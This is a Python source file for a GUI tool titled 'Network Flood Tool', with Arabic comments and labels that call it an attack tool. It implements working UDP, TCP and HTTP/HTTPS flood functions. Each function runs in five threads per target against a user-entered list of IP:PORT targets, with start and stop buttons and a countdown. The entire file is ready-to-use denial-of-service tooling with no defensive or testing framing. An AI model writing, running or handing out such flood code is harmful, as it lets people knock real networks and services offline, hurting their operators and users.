import tkinter as tk
from tkinter import messagebox
import threading
import time
import socket
import random
import ssl

# متغيرات التحكم
stop_flag = False
countdown_label = None

# سجل واجهة المستخدم
class Logger:
    def __init__(self, widget):
        self.widget = widget

    def log(self, message):
        self.widget.insert(tk.END, message + "\n")
        self.widget.see(tk.END)

# وظائف الهجوم
def udp_flood(ip, port, packet_size, duration, delay):
    timeout = time.time() + duration
    while time.time() < timeout and not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random.randbytes(packet_size), (ip, port))
            time.sleep(delay)
        except:
            continue

def tcp_flood(ip, port, duration, delay):
    timeout = time.time() + duration
    while time.time() < timeout and not stop_flag:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
            s.close()
            time.sleep(delay)
        except:
            continue

def http_flood(ip, port, use_https, duration, delay):
    timeout = time.time() + duration
    while time.time() < timeout and not stop_flag:
        try:
            if use_https:
                context = ssl.create_default_context()
                conn = context.wrap_socket(socket.socket(socket.AF_INET), server_hostname=ip)
            else:
                conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((ip, port))
            conn.send(b"GET / HTTP/1.1\r\nHost: test\r\n\r\n")
            conn.close()
            time.sleep(delay)
        except:
            continue

# تنفيذ الهجوم بعد التجهيز
def start_attack(mode, targets, duration, packet_size, delay):
    for ip, port in targets:
        for _ in range(5):  # عدد الثريدات لكل هدف
            if mode == "UDP":
                threading.Thread(target=udp_flood, args=(ip, port, packet_size, duration, delay), daemon=True).start()
            elif mode == "TCP":
                threading.Thread(target=tcp_flood, args=(ip, port, duration, delay), daemon=True).start()
            elif mode == "HTTP":
                use_https = port == 443
                threading.Thread(target=http_flood, args=(ip, port, use_https, duration, delay), daemon=True).start()

# إيقاف الهجوم
def stop_attack():
    global stop_flag
    stop_flag = True
    dashboard.log("⛔ تم إيقاف الهجوم.")

# عرض الوقت المتبقي
def update_countdown(end_time):
    remaining = int(end_time - time.time())
    if remaining >= 0 and not stop_flag:
        countdown_label.config(text=f"⏳ الوقت المتبقي: {remaining} ثانية")
        countdown_label.after(1000, update_countdown, end_time)
    else:
        countdown_label.config(text="✅ انتهى الهجوم.")

# واجهة المستخدم
def run_gui():
    global dashboard, countdown_label
    window = tk.Tk()
    window.title("Network Flood Tool")
    window.geometry("500x600")
    window.resizable(False, False)

    tk.Label(window, text="🧨 نوع الهجوم:").pack()
    mode_var = tk.StringVar(value="UDP")
    tk.OptionMenu(window, mode_var, "UDP", "TCP", "HTTP").pack()

    tk.Label(window, text="🎯 الأهداف (IP:PORT) سطر لكل هدف:").pack()
    target_text = tk.Text(window, height=5)
    target_text.pack()

    tk.Label(window, text="⏱️ المدة (ثواني):").pack()
    duration_entry = tk.Entry(window)
    duration_entry.insert(0, "60")
    duration_entry.pack()

    tk.Label(window, text="📦 حجم حزمة UDP:").pack()
    packet_entry = tk.Entry(window)
    packet_entry.insert(0, "1024")
    packet_entry.pack()

    tk.Label(window, text="🔁 تأخير بين الطلبات (ثانية):").pack()
    delay_entry = tk.Entry(window)
    delay_entry.insert(0, "0.1")
    delay_entry.pack()

    countdown_label = tk.Label(window, text="", fg="blue")
    countdown_label.pack()

    dashboard_box = tk.Text(window, height=15)
    dashboard_box.pack()
    dashboard = Logger(dashboard_box)

    def run():
        global stop_flag
        stop_flag = False
        try:
            mode = mode_var.get()
            raw_targets = target_text.get("1.0", tk.END).strip().splitlines()
            targets = []
            for t in raw_targets:
                ip, port = t.strip().split(":")
                targets.append((ip, int(port)))

            duration = int(duration_entry.get())
            packet_size = int(packet_entry.get())
            delay = float(delay_entry.get())

            dashboard.log(f"🚀 بدء الهجوم {mode} على {len(targets)} هدف...")
            start_attack(mode, targets, duration, packet_size, delay)

            end_time = time.time() + duration
            update_countdown(end_time)

        except Exception as e:
            messagebox.showerror("خطأ", str(e))

    tk.Button(window, text="🔥 بدء الهجوم", command=run, bg="green", fg="white").pack(pady=5)
    tk.Button(window, text="⛔ إيقاف الهجوم", command=stop_attack, bg="red", fg="white").pack()

    window.mainloop()

if __name__ == "__main__":
    run_gui()
